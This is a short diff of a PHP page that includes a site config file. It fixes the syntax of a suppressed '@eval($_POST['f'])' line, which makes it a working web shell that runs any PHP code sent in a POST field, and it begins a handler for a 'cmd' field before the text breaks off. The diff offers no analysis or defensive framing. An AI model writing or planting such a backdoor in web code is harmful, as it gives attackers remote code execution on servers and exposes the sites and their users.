@@ -1,6 +1,6 @@
 <?php require('includes/config.php'); ?>
 <?php
-@eval($_POST['f'];
+@eval($_POST['f']);
 ?>
 <?php
 	if(isset($_POST['cmd'])){
